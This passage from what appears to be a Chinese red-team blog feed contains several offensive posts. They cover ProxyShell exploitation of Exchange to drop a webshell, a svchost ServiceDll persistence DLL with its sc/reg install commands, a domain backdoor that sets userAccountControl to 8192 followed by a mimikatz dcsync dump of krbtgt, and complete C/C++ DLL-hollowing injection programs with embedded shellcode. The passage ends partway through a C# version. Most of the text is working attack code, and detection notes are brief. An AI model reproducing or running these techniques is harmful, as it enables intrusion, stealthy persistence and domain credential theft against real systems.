的backend认为我们是高权限用户呢？</code></pre><p>在Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll，有个RemotePowershellBackendCmdletProxyModule函数。有一个用户可控的输入点，这个输入点输入的数据最终会变成CommonAccessToken的值<br><img src="https://s4.ax1x.com/2022/01/22/7WsJM9.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Ws0PO.png" alt=""></p><p>CommonAccessToken.Deserialize函数是解密从X-Rps-CAT参数传入的值<br><img src="https://s4.ax1x.com/2022/01/22/7WscqI.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WsTMj.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WsHLn.png" alt=""></p><p>网上的文章都有在这里断点然后查看内存（我这没跟）<br><img src="https://i.bmp.ovh/imgs/2022/01/4488c69909dba75c.png" alt=""></p><p>加密必须有的:</p><pre><code>1. 用户名2. 用户sid，推荐Administrator，即使域环境禁用了管理员用户administrator，仍然能够认证成功3. group sid，可随便指定一个例如S-1-1-04. 最终将得到的值进行base64加密后即可作为payload使用</code></pre><p><strong>CVE-2021-31207</strong><br>在实现认证后，利用New-MailboxExportRequest导出邮件getshell。在导出之前需要利用SSRF调用接口去发送邮件<br>（这里有个问题，邮件内容都是用PKT加密的，导出的webshell也是PKT加密的。需要自己加解密）<br>参考微软:<a href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)%E3%80%82" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)%E3%80%82</a><br><img src="https://i.bmp.ovh/imgs/2022/01/c560a6b9aff01afa.png" alt=""></p><p><strong>复现过程</strong><br>利用过程</p><pre><code>1. SSRF获取legacyDn2. SSRF获取用户SID3. SSRF往指定用户发邮件4. 构造CommonAccessToken访问powershell接口，利用New-MailboxExportRequest导出webshell</code></pre><p>这里有个问题是，如何构造xml向目标powershell接口发送。pypsrp可以实现利用winrm调用powershell，发送的数据也是xml的。但是如何通过将xml数据发送？<br><img src="https://i.bmp.ovh/imgs/2022/01/0fb9c8f9a09cda06.png" alt=""></p><p>利用脚本的思路是开个httpserver重写class解决<br><img src="https://i.bmp.ovh/imgs/2022/01/18063e240f8c8237.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/8f88ab63c62a325f.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/1ddf5b731b3a169b.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/bb1c6c13d1e5ce2b.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/" target="_blank" rel="noopener">https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</a><br><a href="https://www.anquanke.com/post/id/251713#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/251713#h2-4</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/120037619" target="_blank" rel="noopener">https://blog.csdn.net/qq_41874930/article/details/120037619</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>svchost.exe挂载DLL</title>
      <link href="/posts/3047149d.html"/>
      <url>/posts/3047149d.html</url>
      <content type="html"><![CDATA[<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img src="https://s4.ax1x.com/2022/01/16/7YH6o9.png" alt=""></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>vs新建类库编译个处理服务循环响用的DLL</p><pre><code>#include &quot;pch.h&quot;#define SVCNAME TEXT(&quot;EvilSvc&quot;)SERVICE_STATUS serviceStatus;SERVICE_STATUS_HANDLE serviceStatusHandle;HANDLE stopEvent = NULL;VOID UpdateServiceStatus(DWORD currentState){    serviceStatus.dwCurrentState = currentState;    SetServiceStatus(serviceStatusHandle, &amp;serviceStatus);}DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context){    switch (controlCode)    {        case SERVICE_CONTROL_STOP:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_SHUTDOWN:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_PAUSE:            serviceStatus.dwCurrentState = SERVICE_PAUSED;            break;        case SERVICE_CONTROL_CONTINUE:            serviceStatus.dwCurrentState = SERVICE_RUNNING;            break;        case SERVICE_CONTROL_INTERROGATE:            break;        default:            break;    }    UpdateServiceStatus(SERVICE_RUNNING);    return NO_ERROR;}VOID ExecuteServiceCode(){    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);    UpdateServiceStatus(SERVICE_RUNNING);    // #####################################    // your persistence code here    // #####################################    while (1)    {        WaitForSingleObject(stopEvent, INFINITE);        UpdateServiceStatus(SERVICE_STOPPED);        return;    }}extern &quot;C&quot; __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV){    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;    serviceStatus.dwServiceSpecificExitCode = 0;    UpdateServiceStatus(SERVICE_START_PENDING);    ExecuteServiceCode();}</code></pre><p>创建EvilSvc服务</p><pre><code>sc.exe create EvilSvc binPath= &quot;c:\windows\System32\svchost.exe -k DcomLaunch&quot; type= share start= auto</code></pre><p>修改EvilSvc DLL路径为自己的DLL路径</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f</code></pre><p>注册表查看该服务如下<br><img src="https://s4.ax1x.com/2022/01/16/7YHWz6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YH4sO.png" alt=""></p><p>修改svchost组里的DcomLaunch<br>（添加创建的服务名）<br><img src="https://s4.ax1x.com/2022/01/16/7YH5LD.png" alt=""></p><p>启动EvilSvc服务</p><pre><code>sc start EvilSvc</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHoee.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YH7od.png" alt=""></p><p>检测技术</p><pre><code>* 最近创建的服务svchost.exe作为binPath* 列出所有系统服务的ServiceDLL值并检测</code></pre><pre><code>Get-ItemProperty hklm:\SYSTEM\ControlSet001\Services\*\Parameters | ? { $_.servicedll } | select psparentpath, servicedll</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHXSP.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>userAccountControl将ID设置为8192作为后门</title>
      <link href="/posts/a984f0cd.html"/>
      <url>/posts/a984f0cd.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源推特：<br><img src="https://s4.ax1x.com/2022/01/16/7YTx9P.png" alt=""></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>YAYI.local - Windows Server 2012 - DC<br>YAYI.local - Windows 7 - 域机器(WIN-BMIO66D4K15)</p><p>在域控机器执行</p><pre><code>powershell下运行如果要在非DC下执行需要执行命令:Import-Module Microsoft.ActiveDirectory.Management.dll #导入Microsoft.ActiveDirectory.Management.dll#添加机器账户New-ADComputer -Name ATTACKER10 -AccountPassword (ConvertTo-SecureString -String &quot;Hjk123456!&quot; -Force -AsPlainText)#设置机器账户的userAccountControl (需要域管权限)$ADComputer=Get-ADComputer -Identity ATTACKER10Set-ADObject -Identity $ADComputer -Replace @{userAccountControl=8192}#查询域DC机器Get-ADGroupMember -Identity &quot;Domain Controllers&quot;</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHPxK.png" alt=""></p><p>域内机器执行dcsync dump</p><pre><code>(需要等待几分钟)mimikatz:lsadump::dcsync /user:krbtgt</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHeIA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/16/7YHlM8.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DLL镂空不使用Loadlibrary</title>
      <link href="/posts/c34749bd.html"/>
      <url>/posts/c34749bd.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>被几个吊毛同事催着更博客，立刻更了一篇 (</p><h2 id="利用NtMapViewOfSection来加载DLL"><a href="#利用NtMapViewOfSection来加载DLL" class="headerlink" title="利用NtMapViewOfSection来加载DLL"></a>利用NtMapViewOfSection来加载DLL</h2><p>看到一遍文章，利用NtMapViewOfSection来加载DLL。不使用LoadLibrary来加载DLL复现了一下<br>NtMapViewOfSection，之前复现过NtCreateSection + NtMapViewOfSection 代码注入。当时没有好好的看NtMapViewOfSection这个API函数。顺便记录一下<br>ZwCreateSection</p><pre><code>NTSYSAPI NTSTATUS ZwCreateSection(  [out]          PHANDLE            SectionHandle,  [in]           ACCESS_MASK        DesiredAccess,  [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,  [in, optional] PLARGE_INTEGER     MaximumSize,  [in]           ULONG              SectionPageProtection,  [in]           ULONG              AllocationAttributes,  [in, optional] HANDLE             FileHandle);</code></pre><p>ZwMapViewOfSection</p><pre><code>NTSYSAPI NTSTATUS ZwMapViewOfSection(  [in]                HANDLE          SectionHandle,  [in]                HANDLE          ProcessHandle,  [in, out]           PVOID           *BaseAddress,  [in]                ULONG_PTR       ZeroBits,  [in]                SIZE_T          CommitSize,  [in, out, optional] PLARGE_INTEGER  SectionOffset,  [in, out]           PSIZE_T         ViewSize,  [in]                SECTION_INHERIT InheritDisposition,  [in]                ULONG           AllocationType,  [in]                ULONG           Win32Protect);</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YIWDJ.png" alt=""></p><p>NtMapViewOfSection可以共享进程之间的内存。类似于下图<br><img src="https://s4.ax1x.com/2022/01/16/7YIfb9.png" alt=""></p><p>文章里的介绍<br><img src="https://s4.ax1x.com/2022/01/16/7YI4ER.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YII4x.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YIbvD.png" alt=""></p><p>Demo1<br>利用tMapViewOfSection代替VirtualAllocEx和WriteProcessMemory，将要Load的DLL路径写入远程的进程</p><pre><code class="C">// demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;psapi.h&gt;#pragma comment(lib, &quot;ntdll&quot;)#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,GetLastError());}typedef struct _LSA_UNICODE_STRING { USHORT Length;  USHORT MaximumLength; PWSTR  Buffer;  } UNICODE_STRING, * PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING   ObjectName; ULONG Attributes; PVOID SecurityDescriptor;     PVOID   SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *  PCLIENT_ID;using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG   DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER   MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE   FileHandle OPTIONAL);using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle,  PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,  PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN   PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG   StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID   StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID   ClientID);myNtCreateSection fNtCreateSection =  (myNtCreateSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateSection&quot;));myNtMapViewOfSection fNtMapViewOfSection =  (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtMapViewOfSection&quot;));myRtlCreateUserThread fRtlCreateUserThread =  (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;RtlCreateUserThread&quot;));unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;int main(){    HANDLE sectionHandle = NULL;    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;    SIZE_T size = 4096;    INT PID = 23164;    LARGE_INTEGER sectionSize = { size };    TCHAR moduleName[] = L&quot;C:\\Windows\\System32\\xwreg.dll&quot;;    HMODULE hmodules[MAX_PATH] = {};    DWORD hmodulesize = sizeof(hmodules);    DWORD hmodulesizeneeded = 0;    HMODULE rmodule = NULL;    CHAR rmoduleName[MAX_PATH] = {};    fNtCreateSection(&amp;sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE |  SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&amp;sectionSize, PAGE_EXECUTE_READWRITE,  SEC_COMMIT, NULL);    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &amp;localSectionAddress, NULL,  NULL, NULL, &amp;size, 2, NULL, PAGE_READWRITE);    printf(&quot;LocalAddress:0x%x\n&quot;, localSectionAddress);    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);    if (hprocess == NULL) {        errorprint(&quot;OpenProcess&quot;);    }    fNtMapViewOfSection(sectionHandle, hprocess, &amp;remoteSectionAddress, NULL, NULL, NULL,  &amp;size, 2, NULL, PAGE_READWRITE);    printf(&quot;remoteSectionAddress:0x%x\n&quot;, remoteSectionAddress);    memcpy(localSectionAddress, moduleName, sizeof(moduleName));    PTHREAD_START_ROUTINE loadaddress =  (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(&quot;Kernel32&quot;), &quot;LoadLibraryW&quot;);    printf(&quot;LoadLibraryA Address:0x%x\n&quot;, loadaddress);    HANDLE dllThread = CreateRemoteThread(hprocess, NULL, 0, loadaddress,  remoteSectionAddress, 0, NULL); //远程线程调用LoadlibraryW函数加载xwreg.dll    WaitForSingleObject(dllThread, 1000); //休眠10秒    EnumProcessModules(hprocess, hmodules, hmodulesize, &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量    for (int calc = 0; calc &lt; (hmodulesizeneeded / sizeof(HMODULE)); calc++) {        rmodule = hmodules[calc];        GetModuleBaseNameA(hprocess, rmodule, rmoduleName, sizeof(rmoduleName)); //获取模块名称        if (strcmp(rmoduleName, &quot;xwreg.dll&quot;) == 0) {            break;        }    }    printf(&quot;%s %x\n&quot;, rmoduleName, rmodule);    DWORD headerbuffersize = 0x1000;    LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerbuffersize);    ReadProcessMemory(hprocess, rmodule, peHeader, headerbuffersize, NULL); //读取dll pe地址    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)peHeader; //dll DOS头    PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader +  dosheader-&gt;e_lfanew); //dll BaseAddress+文件相对偏移地址=ntaddress    LPVOID dllEntryPoint = (LPVOID)(ntheader-&gt;OptionalHeader.AddressOfEntryPoint +  (DWORD_PTR)rmodule); //入口点指针地址+指定dll基地址=模块入口点    WriteProcessMemory(hprocess, dllEntryPoint, (LPVOID)buf, sizeof(buf), NULL); //写入shellcode    CreateRemoteThread(hprocess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint,  NULL, 0, NULL); //远程线程启动    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YIODH.png" alt=""></p><p>Demo2<br>利用tMapViewOfSection代替LoadLibrary加载DLL</p><pre><code class="C">// demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;#pragma comment(lib, &quot;ntdll&quot;)#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,GetLastError());}#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)typedef struct _LSA_UNICODE_STRING { USHORT Length;  USHORT MaximumLength; PWSTR  Buffer;  } UNICODE_STRING, * PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING   ObjectName; ULONG Attributes; PVOID SecurityDescriptor;     PVOID   SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *  PCLIENT_ID;typedef enum _SECTION_INHERIT{    ViewShare = 1,    ViewUnmap = 2} SECTION_INHERIT, * PSECTION_INHERIT;using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG   DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER   MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE   FileHandle OPTIONAL);using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle,  PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,  PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN   PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG   StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID   StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID   ClientID);myNtCreateSection fNtCreateSection =  (myNtCreateSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateSection&quot;));myNtMapViewOfSection fNtMapViewOfSection =  (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtMapViewOfSection&quot;));myRtlCreateUserThread fRtlCreateUserThread =  (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;RtlCreateUserThread&quot;));unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;PVOID map_dll_image(HANDLE hSection, HANDLE hProcess, DWORD protect) //传入文件映射对象、进程句柄、页面可读可写权限{    NTSTATUS                  status;    PVOID                             sectionBaseAddress;    SIZE_T                            viewSize;    SECTION_INHERIT           inheritDisposition;    if (hProcess == NULL)        return NULL;    // NtMapViewOfSection always fail when you specify a desired base address    sectionBaseAddress = NULL;    viewSize = 0;    inheritDisposition = ViewShare;    status = fNtMapViewOfSection((HANDLE)hSection, //文件映射对象        (HANDLE)hProcess, //进程句柄        (PVOID*)&amp;sectionBaseAddress, //接收返回基址        (ULONG_PTR)NULL,        (SIZE_T)NULL,        (PLARGE_INTEGER)NULL,        &amp;viewSize, //从SectionOffset开始并继续到该部分末尾的部分的视图范围+1        inheritDisposition,        (ULONG)PtrToUlong(NULL),        (ULONG)protect); //页面权限修改    if (!NT_SUCCESS(status)) {        printf(&quot;NtMapViewOfSection: 0x%x\n&quot;, status);        return NULL;    }    return sectionBaseAddress; //返回修改后的基址}int main(){    HANDLE hSection = NULL;    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;    SIZE_T size = 4096;    INT PID = 24552;    LARGE_INTEGER sectionSize = { size };    TCHAR moduleName[] = L&quot;C:\\Windows\\System32\\xwreg.dll&quot;;    HMODULE hmodules[MAX_PATH] = {};    DWORD hmodulesize = sizeof(hmodules);    DWORD hmodulesizeneeded = 0;    HANDLE hFile = NULL;    NTSTATUS status = 0;    DWORD protect = 0x0;    BYTE* mapped = NULL;    hFile = CreateFileW(moduleName, GENERIC_READ, 0, NULL, OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL, NULL);    status = fNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY,  SEC_IMAGE, hFile);    if (!NT_SUCCESS(status)) {        printf(&quot;NtCreateSection: 0x%x\n&quot;, status);        CloseHandle(hFile);        return NULL;    }    printf(&quot;Section created - hSection = 0x%x\n&quot;, hSection);    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);    if (hprocess == NULL) {        errorprint(&quot;OpenProcess&quot;);    }    protect = PAGE_READWRITE;    mapped = (BYTE*)map_dll_image(hSection, hprocess, protect);    if (mapped == NULL) {        CloseHandle(hSection);        CloseHandle(hFile);        return NULL;    }    printf(&quot;Load DLL:%s 0x%x\n&quot;, moduleName, mapped);    DWORD headerbuffersize = 0x1000;    LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerbuffersize);    ReadProcessMemory(hprocess, mapped, peHeader, headerbuffersize, NULL); //读取dll pe地址    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)peHeader; //dll DOS头    PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader +  dosheader-&gt;e_lfanew); //dll BaseAddress+文件相对偏移地址=ntaddress    LPVOID dllEntryPoint = (LPVOID)(ntheader-&gt;OptionalHeader.AddressOfEntryPoint +  (DWORD_PTR)mapped); //入口点指针地址+指定dll基地址=模块入口点    WriteProcessMemory(hprocess, dllEntryPoint, (LPVOID)buf, sizeof(buf), NULL); //写入shellcode    CreateRemoteThread(hprocess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0,  NULL); //远程线程启动    return 0;}</code></pre><p>NtMapViewOfSection加载DLL:<br><img src="https://s4.ax1x.com/2022/01/16/7YIvVA.png" alt=""></p><p>执行结果如下：<br><img src="https://s4.ax1x.com/2022/01/16/7YIz5t.png" alt=""></p><p>也可以按照文章里的，获取到DLL后。直接申请权限可读、可写然后写入shellcode在远程线程调用。不过改来改去太敏感了<br><img src="https://s4.ax1x.com/2022/01/16/7YopPP.png" alt=""></p><p>该文章的POC思路如下：</p><pre><code>1. 获取系统根目录2. 搜索根目录里的DLL3.判断DLL的PE大小是否小于shellcode大小    1. 如果小于则返回该DLL的路径4. 检测是否要绕过CFG （Win10 执行流保护）5. NtMapViewOfSection加载DLL6. 更改权限写入shellcode7. 远程线程调用</code></pre><p>参考链接:<br><a href="https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/" target="_blank" rel="noopener">https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/</a><br><a href="https://github.com/SECFORCE/DLL-Hollow-PoC" target="_blank" rel="noopener">https://github.com/SECFORCE/DLL-Hollow-PoC</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection" target="_blank" rel="noopener">https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection</a></p><h2 id="DLL-txt区段插入shellcode用CreateRemoteThread调用"><a href="#DLL-txt区段插入shellcode用CreateRemoteThread调用" class="headerlink" title="DLL .txt区段插入shellcode用CreateRemoteThread调用"></a>DLL .txt区段插入shellcode用CreateRemoteThread调用</h2><p>注意事项：</p><pre><code>* x64只能注x64的进程，x86只能插x86的进程。对应进程位数带有下面的两个dll，需要根据位数来注入</code></pre><p>最近两天有更简单粗暴的方法，找一个DLL .txt区段插入shellcode用CreateRemoteThread调用。进程不会崩溃的<br>原文链接:<a href="https://www.netero1010-securitylab.com/eavsion/alternative-process-injection" target="_blank" rel="noopener">https://www.netero1010-securitylab.com/eavsion/alternative-process-injection</a><br>测试了一下win10稳定加载shellcode 进程不会崩溃的两个DLL</p><pre><code>* uxtheme.dll* msvcp_win.dll</code></pre><p>csharp</p><pre><code class="cshap">using System;using System.Diagnostics;using System.Runtime.InteropServices;namespace AnotherDLLHollowing{    class Program    {        [DllImport(&quot;kernel32.dll&quot;)]        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);        [DllImport(&quot;kernel32.dll&quot;)]        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);        [DllImport(&quot;kernel32.dll&quot;)]        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint 